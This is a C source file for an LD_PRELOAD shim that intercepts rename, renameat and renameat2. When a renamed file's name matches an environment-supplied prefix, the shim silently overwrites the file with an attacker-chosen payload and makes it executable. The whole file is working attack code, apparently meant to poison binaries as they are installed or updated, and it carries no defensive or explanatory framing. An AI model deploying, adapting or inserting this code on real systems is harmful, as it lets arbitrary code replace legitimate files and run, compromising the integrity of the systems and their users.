#define _GNU_SOURCE

#include <dlfcn.h>
#include <fcntl.h>
#include <libgen.h>
#include <limits.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sendfile.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static bool should_poison(const char *path) {
    const char *prefix = getenv("POISON_PREFIX");
    if (!path || !prefix) {
        return false;
    }

    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;
    size_t prefix_len = strlen(prefix);
    return strncmp(base, prefix, prefix_len) == 0;
}

static void copy_payload(const char *dst) {
    const char *payload = getenv("PAYLOAD_PATH");
    if (!payload || !dst) {
        return;
    }

    int src_fd = open(payload, O_RDONLY);
    if (src_fd < 0) {
        return;
    }

    int dst_fd = open(dst, O_WRONLY | O_TRUNC);
    if (dst_fd < 0) {
        close(src_fd);
        return;
    }

    struct stat st;
    if (fstat(src_fd, &st) == 0) {
        off_t offset = 0;
        ssize_t remaining = st.st_size;
        while (remaining > 0) {
            ssize_t sent = sendfile(dst_fd, src_fd, &offset, remaining);
            if (sent <= 0) {
                break;
            }
            remaining -= sent;
        }
    }

    fchmod(dst_fd, 0755);
    close(dst_fd);
    close(src_fd);
}

int rename(const char *oldpath, const char *newpath) {
    static int (*real_rename)(const char *, const char *) = NULL;
    if (!real_rename) {
        real_rename = dlsym(RTLD_NEXT, "rename");
    }

    int rc = real_rename(oldpath, newpath);
    if (rc == 0 && should_poison(newpath)) {
        copy_payload(newpath);
    }
    return rc;
}

int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath) {
    static int (*real_renameat)(int, const char *, int, const char *) = NULL;
    if (!real_renameat) {
        real_renameat = dlsym(RTLD_NEXT, "renameat");
    }

    int rc = real_renameat(olddirfd, oldpath, newdirfd, newpath);
    if (rc == 0 && should_poison(newpath) && newpath[0] == '/') {
        copy_payload(newpath);
    }
    return rc;
}

int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags) {
    static int (*real_renameat2)(int, const char *, int, const char *, unsigned int) = NULL;
    if (!real_renameat2) {
        real_renameat2 = dlsym(RTLD_NEXT, "renameat2");
    }

    int rc = real_renameat2(olddirfd, oldpath, newdirfd, newpath, flags);
    if (rc == 0 && should_poison(newpath) && newpath[0] == '/') {
        copy_payload(newpath);
    }
    return rc;
}
